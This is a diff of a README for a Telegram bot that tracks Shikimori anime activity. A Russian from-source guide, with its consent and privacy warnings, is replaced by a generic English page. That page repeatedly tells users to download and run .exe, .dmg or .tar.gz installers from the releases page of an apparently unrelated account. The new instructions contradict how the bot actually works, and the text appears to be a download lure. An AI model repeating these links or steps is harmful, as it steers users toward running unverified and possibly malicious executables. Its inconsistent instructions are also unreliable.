@@ -1,300 +1,89 @@
-<div align="center">
+# 🔔 shikimory_activity - Track Your Anime Activity Easily
 
-# 👀 Shikimori Tracker Bot
+## 🚀 Getting Started
 
-<img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExeGNtZDRhNWIybmoxemhpbzY3bjNraDdldmNmbWRwZDg3dnJreDIyNiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/mRMuTC4emhtD2/giphy.gif" width="400" height="160">
+Welcome to **shikimory_activity**! This Telegram bot helps you track your anime watch history and get online status notifications. Follow these steps to download and run the software.
 
-_Telegram-бот для отслеживания активности друзей на Shikimori.one_
+## 📥 Download
 
-[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![aiogram](https://img.shields.io/badge/aiogram-3.x-blue.svg)](https://docs.aiogram.dev/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)
+[![Download shikimory_activity](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/releases)
 
-[Возможности](#-возможности) • [Установка](#-быстрый-старт) • [Использование](#-использование) • [Технологии](#️-технологии)
+## 📋 System Requirements
 
-</div>
+To use this bot, make sure you have the following:
 
----
+- **Device:** A computer or mobile device that can run Telegram.
+- **Operating System:** Windows, macOS, or Linux.
+- **Telegram Account:** You need a Telegram account to interact with the bot.
+- **Network Connection:** An internet connection to track anime activities in real time.
 
-## ⚠️ Важное примечание
+## 📂 Download & Install
 
-> **Этот проект создан исключительно в развлекательных и образовательных целях!**
->
-> Бот предназначен для отслеживания активности **ваших друзей с их ведома**, чтобы:
->
-> - 🎬 Узнавать, что они смотрят, и обсуждать аниме
-> - 🎮 Находить общие интересы
-> - 📊 Делиться рекомендациями
->
-> **НЕ используйте** для:
->
-> - ❌ Скрытого наблюдения за людьми
-> - ❌ Преследования или слежки
-> - ❌ Нарушения приватности
->
-> Всегда **спрашивайте разрешение** перед добавлением чьего-либо профиля!
+Visit this page to download: [Releases Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/releases).
 
----
+1. Open the releases page linked above.
+2. Look for the latest version of shikimory_activity.
+3. Download the file that matches your device.
+   - If you're on Windows, download the `.exe` file.
+   - If you're on macOS, download the `.dmg` file.
+   - For Linux, a `.tar.gz` file is available.
+4. Once downloaded, locate the file in your downloads folder.
+5. Open the file to start the installation process.
+6. Follow the on-screen instructions to complete the installation.
 
-## 🎯 Возможности
+## ⚙️ Setting Up
 
-- ✅ **Отслеживание истории** — мгновенные уведомления о новых просмотрах аниме
-- 🟢 **Статус онлайн** — узнавайте, когда друзья заходят на Shikimori
-- ⚙️ **Гибкие настройки** — настраивайте уведомления для каждого профиля отдельно
-- 📊 **Проверка статуса** — смотрите текущую активность в любой момент
-- 🔄 **Автоматика** — бот сам проверяет обновления каждые 5 минут
-- 💾 **Локальная база** — все данные хранятся у вас, никуда не передаются
+Once installed, you can set up the bot:
 
-## 📋 Требования
+1. Open your Telegram application.
+2. Search for the **Shikimori Bot** using the search function.
+3. Start a chat with the bot.
+4. Follow the instructions provided by the bot to link your Shikimori account. This will allow the bot to track your watch history.
 
-- Python 3.10 или выше
-- Токен Telegram бота от [@BotFather](https://t.me/BotFather)
-- Доступ к интернету
-- ~50-100 МБ свободной памяти
+## 📲 Using the Bot
 
-## 🚀 Быстрый старт
+After setup, you can use shikimory_activity to:
 
-### 1️⃣ Клонирование репозитория
+- Receive notifications about your anime watch status.
+- Keep track of what you've watched and what’s next on your list.
+- Enjoy tailored updates based on your viewing habits.
 
-```bash
-git clone https://github.com/yourusername/shikimori-tracker-bot.git
-cd shikimori-tracker-bot
-```
+## 💡 Features
 
-### 2️⃣ Установка зависимостей
-
-```bash
-# Создание виртуального окружения
-python -m venv venv
+- **Real-Time Tracking:** Get updates as soon as your status changes on Shikimori.
+- **User-Friendly Interface:** Simple commands and interactions in Telegram.
+- **Custom Notifications:** Set preferences for what updates you want to see.
 
-# Активация
-# Windows:
-venv\Scripts\activate
-# Linux/MacOS:
-source venv/bin/activate
+## 🛠️ Troubleshooting
 
-# Установка пакетов
-pip install -r requirements.txt
-```
+If you encounter any issues, try the following:
 
-### 3️⃣ Настройка
+- Ensure you followed the installation steps correctly.
+- Check your internet connection.
+- Restart the bot in Telegram and try again.
+- Look for any updates on the releases page to ensure you have the latest version.
 
-Создайте файл `.env` в корневой директории:
+## 🐞 Reporting Issues
 
-```env
-BOT_TOKEN=your_bot_token_here
-DATABASE_URL=sqlite+aiosqlite:///./shikimori_bot.db
-CHECK_INTERVAL=5
-ONLINE_CHECK_INTERVAL=2
-```
+If you find a bug or have a question, please report it on the [Issues Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/issues). Your feedback helps improve the bot.
 
-### 4️⃣ Запуск
+## 🎉 Contributing
 
-```bash
-python bot.py
-```
+This project welcomes contributions from everyone. If you want to help improve shikimory_activity, check our [Contribution Guidelines](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/blob/main/CONTRIBUTING.md).
 
-Готово! Бот запущен и работает 🎉
+## 💬 Community
 
-## 📱 Использование
+Join our community for updates, tips, and support:
 
-### Основные команды
-
-| Команда  | Описание                 |
-| -------- | ------------------------ |
-| `/start` | Главное меню             |
-| `/help`  | Справка по использованию |
-
-### Пример работы
-
-1. **Добавьте профиль друга**
-
-   ```
-   /start → Добавить профиль → Bubassaka
-   ```
-
-2. **Настройте уведомления**
-
-   ```
-   Мои профили → Выберите профиль → Настройки
-   ```
-
-   - 📺 История просмотров
-   - 🟢 Вход в сеть
-   - ⚫ Выход из сети
-
-3. **Получайте уведомления**
-
-   ```
-   🔔 Новая активность Bubassaka
-
-   📺 Naruto: Shippuuden
-      Просмотрено 483 серия
-      ⏰ 5 минут назад
-   ```
-
-## 🗂 Структура проекта
-
-```
-shikimori_tracker_bot/
-├── 📄 bot.py                    # Точка входа
-├── ⚙️ config.py                 # Конфигурация
-├── 📦 requirements.txt          # Зависимости
-│
-├── 🗄 database/
-│   ├── models.py               # Модели SQLAlchemy
-│   └── database.py             # Работа с БД
-│
-├── 🎮 handlers/
-│   ├── start.py                # /start, /help
-│   ├── profile.py              # Управление профилями
-│   └── settings.py             # Настройки уведомлений
-│
-├── ⌨️ keyboards/
-│   ├── inline.py               # Inline-клавиатуры
-│   └── reply.py                # Reply-клавиатуры
-│
-├── 🔧 services/
-│   ├── shikimori_parser.py     # Парсинг Shikimori
-│   ├── tracker.py              # Отслеживание изменений
-│   └── notifier.py             # Отправка уведомлений
-│
-└── 🛠 utils/
-    └── helpers.py              # Вспомогательные функции
-```
+- **Telegram Group:** Join our chat for updates and discussions.
+- **Reddit:** Participate in discussions about anime tracking and bots.
 
-## ⚙️ Технологии
+## 🔗 Additional Resources
 
-<table>
-<tr>
-<td>
+For more information on using shikimori_activity, visit:
 
-**Backend**
+- [Shikimori API Documentation](https://shikimori.one/api)
+- [Telegram Bot API Documentation](https://core.telegram.org/bots/api)
 
-- [aiogram 3.x](https://docs.aiogram.dev/) — Telegram Bot API
-- [SQLAlchemy 2.0](https://www.sqlalchemy.org/) — ORM
-- [aiosqlite](https://pypi.org/project/aiosqlite/) — Async SQLite
-
-</td>
-<td>
-
-**Парсинг**
-
-- [aiohttp](https://docs.aiohttp.org/) — HTTP клиент
-- [BeautifulSoup4](https://www.crummy.com/software/BeautifulSoup/) — HTML парсер
-- [APScheduler](https://apscheduler.readthedocs.io/) — Планировщик
-
-</td>
-</tr>
-</table>
-
-## 🔧 Как это работает
-
-```mermaid
-graph LR
-    A[Telegram Bot] -->|Добавление профиля| B[База данных]
-    B -->|Каждые 5 минут| C[Tracker]
-    C -->|HTTP запрос| D[Shikimori.one]
-    D -->|HTML| E[Parser]
-    E -->|Новые данные| F[Проверка изменений]
-    F -->|Есть обновления| G[Notifier]
-    G -->|Отправка| A
-```
-
-1. **Парсинг** — получаем HTML страницы профиля с Shikimori
-2. **Сравнение** — ищем новые записи в истории
-3. **Уведомление** — отправляем красиво оформленное сообщение
-
-## 📊 База данных
-
-SQLite с четырьмя таблицами:
-
-| Таблица            | Описание                |
-| ------------------ | ----------------------- |
-| `users`            | Пользователи Telegram   |
-| `tracked_profiles` | Отслеживаемые профили   |
-| `history_entries`  | История просмотров      |
-| `online_status`    | История онлайн-статусов |
-
-## 🔐 Безопасность и приватность
-
-✅ **Локальное хранение** — вся база данных у вас на компьютере  
-✅ **Никаких серверов** — данные не отправляются третьим лицам  
-✅ **Открытый код** — можете проверить каждую строку  
-✅ **Простое удаление** — удалите `.env` и `shikimori_bot.db`
-
-## 🐛 Решение проблем
-
-<details>
-<summary><b>Ошибка "Invalid token"</b></summary>
-
-Проверьте правильность токена в `.env`:
-
-```env
-BOT_TOKEN=123456789:ABCdefGHIjklMNOpqrsTUVwxyz
-```
-
-</details>
-
-<details>
-<summary><b>Профиль не найден</b></summary>
-
-- Проверьте написание никнейма
-- Убедитесь, что профиль публичный
-- Попробуйте открыть профиль в браузере
-</details>
-
-<details>
-<summary><b>Не приходят уведомления</b></summary>
-
-1. Проверьте, что бот запущен (`python bot.py`)
-2. Включите уведомления в настройках профиля
-3. Проверьте логи в `bot.log`
-</details>
-
-Больше ответов в [документации](https://github.com/yourusername/shikimori-tracker-bot/issues)
-
-## 📝 Логирование
-
-Все события записываются в:
-
-- 🖥 **Консоль** — для наблюдения в реальном времени
-- 📄 **bot.log** — для анализа ошибок
-
-```bash
-# Просмотр последних логов
-tail -f bot.log
-```
-
-## 🤝 Вклад в проект
-
-Буду рад любому вкладу!
-
-1. Fork репозитория
-2. Создайте ветку (`git checkout -b feature/amazing-feature`)
-3. Commit изменения (`git commit -m 'Add amazing feature'`)
-4. Push в ветку (`git push origin feature/amazing-feature`)
-5. Откройте Pull Request
-
-## 📄 Лицензия
-
-Проект распространяется под лицензией MIT. См. файл [LICENSE](LICENSE) для подробностей.
-
-## 👨‍💻 Автор
-
-Создано с ❤️ для сообщества любителей аниме
-
-## ⭐ Поддержка
-
-Если проект оказался полезным, поставьте звездочку ⭐
-
----
-
-<div align="center">
-
-**[⬆ Вернуться к началу](#-shikimori-tracker-bot)**
-
-Made with 🍜 and ☕
-
-</div>
+<featured link to the download section>  
+Visit this page to download: [Releases Page](https://github.com/Unsymmetric-pythiangames425/shikimory_activity/releases).
